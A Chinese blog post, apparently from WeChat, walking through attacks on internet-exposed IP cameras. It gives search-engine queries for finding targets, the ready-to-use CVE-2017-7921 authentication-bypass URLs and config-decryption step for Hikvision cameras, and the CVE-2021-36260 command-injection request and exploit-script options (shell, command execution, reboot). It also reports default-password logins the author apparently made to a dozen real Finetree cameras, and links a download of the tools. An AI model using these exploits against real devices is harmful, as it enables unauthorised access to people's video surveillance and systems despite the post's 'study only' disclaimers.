> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LUSsUWwrC49kPk-u1hcsDw)

**阅读须知**

**技术文章仅供参考，此文所提供的信息仅用于学习，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

目录：

1.1、海康威视 - IP 摄像机 身份认证绕过（CVE-2017-7921）  
1.2、海康威视 - IP 摄像机 远程代码执行漏洞 (CVE-2021-36260)  
2、Finetree-5MP-Network-Camera  弱密码  
   
**  
1、海康威视—ip 摄像机 利用 FOFA 语法：  
**`app="HIKVISION-视频监控"  
`icon_hash="999357577"  
shodan：https://www.shodan.io/search?query=%22App-webs%22+%22200+OK%22

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzuxBDTEd9fQB4003wOpZzWyblpO3AbLosH7AaupGg0Fg6icUiaNkjbA3w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzjJGSPjmMF69iczoOxPsIARmibt6E2NyMa326EtI2R2hLXUDX9xRSz3bw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FztwDtQLovfzHLDGicNCpYvjAGuJ5GfO5V1tib7KvYng33iceedyKiaUzPkw/640?wx_fmt=png)

**2、海康威视—ip 摄像机 - CVE-2017-7921  
**

```
检索所有用户及其角色的列表：
-http://camera.ip/Security/users?auth=YWRtaW46MTEK
无需身份验证即可获取相机快照：
-http://camera.ip/onvif-http/snapshot?auth=YWRtaW46MTEK
下载相机配置：
-http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK
对配置文件进行解密，实现登录

```

接下来，对上面的流程进行漏洞复现

1、检索所有用户及其角色的列表

‍

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzaODTZXGiameosYhLbEn86jG75H0xT8cynEicWWoezM4rp3hgdJKf8tRA/640?wx_fmt=png)

2、无需身份验证即可获取相机快照  
![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzJ3xhfvtGbAgZZKLtft52dDsuRHleBD2ebxOhgm1zcM7l4M5IfiagCxg/640?wx_fmt=png)

3、下载相机配置

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96Fztd1vUs06832hqkIllg7nYMaicdGeDe5vILvnKn6cLMibV2HokFWDwwQQ/640?wx_fmt=png)

4、使用解密工具，对配置文件进行解密（网盘链接在文章底部）

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzA598FmCH4kaWAn9xQKBQwfD77MNVK23m51TzLO8up8Vlmopqu6FZHA/640?wx_fmt=png)

将配置文件放入同一目录下，使用 cmd

```
python decrypt_configurationFile.py configurationFile

```

得到登录密码

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96Fzr7DYS36mmzQVP2J4LtcS7OW36B5eYWfglH3rPVFYkcIFf1RbeibAAdg/640?wx_fmt=png)

进行登录

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzZFUNic3vKhWVM5PLFlxkV5bpTcjJRAaO3Io5icYq2SSua8h8LnRmg7wg/640?wx_fmt=png)

要显示实时监控，需要安装插件，可自行百度

**3、海康威视—ip 摄像机 - CVE-2021-36260  
**

手工验证流程：  

```
PUT /SDK/webLanguage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 89
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
<?xml version="1.0" encoding="UTF-8"?><language>$(echo a${y}b^www>webLib/dddd)</language>

```

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzoCPicujZMCCoweyHSxFZAV9YVUUgq1WiaxHb6Zl9QKDaPtEAX6R3PwHA/640?wx_fmt=png)

访问 /dddd，显示 ab^www 即可证明存在远程命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96Fz5xfWwzicFja742VxibnuwMoz2ST2kbOTQ8heFqWzrGMugMsQG9EHnvhw/640?wx_fmt=png)

主要是来证明存在命令执行，这个测试命令无害

```
echo a${y}b^www>webLib/dddd

```

${y} 变量 "y" 在上下文中已经被定义，那么它将被插入到字符串 "a" 和 "b" 之间。否则，变量 "y" 会被视为空字符串，因此命令最终会将字符串 "a" 和 "b" 之间插入一个空字符串，得到 "ab"，然后将 "ab" 和字符串 "www" 进行异或运算，得到 "ab^www"。最后，该结果会被写入名为 "webLib/dddd" 的文件中。

大概就是这样，上面我用了小号字，看不懂也没关系

py 脚本验证流程：（网盘链接在文章底部）

```
python CVE-2021-36260.py --rhost ip --rport 端口 --check

```

这是检测命令，下面是一些细节

```
  -h, --help            显示此帮助消息并退出 
  --rhost RHOST         远程目标地址（IP/FDND） 
  --rport RPORT         远程目标端口
  --check               检查是否易受攻击
  --reboot              如果存在漏洞，请重新启动
  --shell               启动SSH shell
  --cmd CMD             执行cmd（即：“ls-l”）
  --cmd_blind CMD_BLIND 执行盲命令（即：“重新启动”）                   
  --noverify            不验证是否存在漏洞
  --proto {http,https}  使用的协议 

```

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzZpMJuJjQvvxugz64GSFGLGzMfOFLVbm96lXEQKayteox1iaia1zYxC0g/640?wx_fmt=png)

执行成功

3、Finetree ip 摄像机  

****利用 FOFA 语法：**** `app="Finetree-5MP-Network-Camera"`

`这个本来``也没什么``写的价值，发现基本上都是USA的ip`

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96Fz9TBXsNhmTO84b7yvR3Ldk45XaoC0ibMatab0q2dwLBJnqLNON9sXQVA/640?wx_fmt=png)

**`离谱的是我用默认密码，一连测了十几个，都可以  
`**

```
admin  admin

```

![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzEe254ZQxbm5XibLuLhtvsqUx2c3UXicsiamKicbQpqdGrlOiaEKcMHI5TIA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/oR0icicZ8wy99oOuPw0vNSHNxNd3dN96FzibSDGpI7HCbO5gndS6DPQIzBm8bwQC3EmnWcDzBsX0UtmialSJiahBcvw/640?wx_fmt=png)

**再次提醒：****技术文章仅供参考，此文所提供的信息仅用于学习，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

网盘：

```
链接：https://pan.baidu.com/s/1Jvnha-y3gQWHS6Ev725Rmg?pwd=c676 
提取码：c676

```

杂谈：

这几天休息，本来是想利用这段时间，做点深刻的事情。具体是哪一种深刻，我也没有想的很明白。总之，它是深刻的。

但是，缺更的这么多天过去了，我深刻的发现，时间被我彻底的浪费掉了。不立 flag 了，脸已经肿了。

我们下期见啦~~